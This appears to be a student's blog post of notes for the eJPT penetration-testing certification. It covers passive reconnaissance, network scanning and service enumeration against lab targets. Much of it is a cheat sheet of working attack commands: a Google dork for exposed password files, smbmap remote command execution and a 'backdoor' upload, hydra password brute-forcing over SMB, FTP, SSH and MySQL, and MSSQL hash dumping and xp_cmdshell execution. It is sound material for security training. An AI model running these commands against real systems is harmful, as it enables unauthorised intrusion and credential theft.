---
title: "Enumeration"
description: "A resume from INE Learning Path for eJPT cert and some self notes to get success"
pubDate: "May 12 2023"
heroImage: "/enumeration.png"
slug: "trip/enumeration"
---

## Passive information gathering

WAF
- WAFWOOF Github tool.

Subdomain Enumeration
- Gobuster
- wfuzz
- etc

Google Dorks -
- http://exploit-db.com
- site: gov.* intitle: "index of" *.csv passwords

Email Harvesting

- theHarvester
  * The tool gathers names, emails, IPs, subdomains, and URLs by using
multiple public resources that include:

Leaked password dbs
- haveibeenpwned.com
- firepwd

## Active information gathering

DNS Zone Transfers
- dnsenum
- dig
- fierce

Host, Port, Services
 - nmap

### Info
Windows Recon: Nmap Host Discovery
Winwos Reconnaissance: SMB

# Footprinting and scanning

## Mapping a network

### Protocol
What protocol matches MAC addresses to IP addresses?

arp
smb
icmp
http

### Tools
- Wireshark
- ARP-SCAN
- PING
- FPING
- NMAP nmap -sn 10.10.33.14/24
- ZENMAP (GUI)
- RustScan
- Masscan

[connection tcp](https://www.ictshore.com/wp-content/uploads/2016/12/1017-02-TCP_States_in_a_connection.png)

# Enumeration

## SMB (Server Message Block)

### Windows Discover and mount

How to mount in powershell:

```bash
# Clear the stored session
net use * /delete

# Mount the target folder
net use Z: \\10.4.17.133\C$ smbserver_771 /user:administrator
```

### SMB Windows Recon: Nmap scripts

```bash
$nmap target
135/tcp   open    msrpc
139/tcp   open    netbios-ssn
445/tcp   open    microsoft-ds

# list the supported protocols and dialects of an SMB server
$nmap -p445 --script smb-protocols target
...

# information about the SMB security level.
$nmap -p445 --script smb-security-mode target
...(but defult usually makes good for hackers)
... acc

# with creds discover sensitive information
$nmap -p445 --script smb-enum-sessions target
...

# In case guest login is not enabled we can always use valid credentials of the target machine to discover the same information
discover the same information.
$nmap -p445 --script smb-enum-sessions --script-args
...smbusername=administrator,smbpassword=smbserver_771 target

$nmap -p445 --script smb-enum-sessions target --script-args smbusername=administrator,smbpassword=smbserver_771 target
...

$nmap -p445 --script smb-enum-shares target
...

$nmap -p445 --script smb-enum-shares target --script-args
...smbusername=administrator,smbpassword=smbserver_771 target

$nmap smb-enum-users 'same as above'

$nmap smb-server-stats 'same as above'

$nmap smb-enum-domains 'same as above'

$nmap smb-enum-groups 'same as above'

$nmap smb-enum-services 'same as above'

# Enumerate folders and list them
$nmap smb-enum-shares,smb-ls 'same as above'

```

### smbmap Recon

```bash
# NULL SESSION - user, pass, directory, host
smbmap -u guest -p "" -d . -H target

# Remote code execution :D!
smbmap -u administrato -p "" -d . -H target -x 'ipconfig'

smbmap -u administrato -p "" -d . -H target -x 'ipconfig' -L

# connect to C drive
smbmap -u administrato -p "" -d . -H target -x 'ipconfig' -r 'C$'

# upload file
smbmap -u Administrator -p "smbserver_771" -H target -d --upload '/root/payload' 'C$\backdoor'

# download file
smbmap -u Administrator -p "smbserver_771" -H target --download 'C$\flag.txt'

```

$nmbloopup -A taget

$nmap target -p445 -sCV 

$rpcclient -U "" -N target

If we see IPC$ maybe null session works
$smbclient -L target -N

...-h
...enumerate

Dictionary attack

hydra -l admin -P /usr/share/wordlist/rockyou.txt target smb(protocol)

if discover pass
smbmap -H target -u admin -p password1

# pivot
$smbclient -L target -U jane
or
$smbclient //target/jane -U jane

other way to find users:
$enum4linux -r -u "admin" -p "password1" target

### FTP


$hydra -L /usr/share/metasploit-framework/data/wordlists/users.txt -P /usr/share/metasploit-framework/data/wordlists/pass.txt target ftp(protocol)

and we have anonymous login

$nmap target -p21 --script ftp-anon


### SSH

$nmap target -p22 --script ssh-hostkey --script-args ssh_hostkey=full
ssh-rsa: .*?

verify is student have password
$nmap target -p22 --script ssh-auth-methods 
--script-args="ssh.user=student"

attack

 $hydra -l student -P /usr/rockyou.txt target ssh(protocol)

### HTTP

http target

find directorios default
$dirb target

$nmap target -sCV -p80 --script http-headers
- http-enum
- http-methods 
- http-webdav-scan


### SQL

$nmap target -sCV -p3306 --script=mysql-empty-password

$nmap target -sCV -p3306 --script=mysql-users --script-args="mysqluser='root', mysqlpass=''"

$nmap target -sCV -p3306 --script=mysql-variables --script-args="mysqluser='root', mysqlpass=''"

$nmap target -sCV -p3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='', mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"

attack

$hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target mysql(protocol)

WINDOWS

$nmap target -p1433 --script ms-sql-info

$nmap target -p1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433

$nmap target -p1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/common_password.txt

$nmap target -p1433 --script ms-sql-empty-password

$nmap target -p1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query='SELECT * FROM master..syslogins' -oN output

$nmap target -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria 

$nmap target -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"

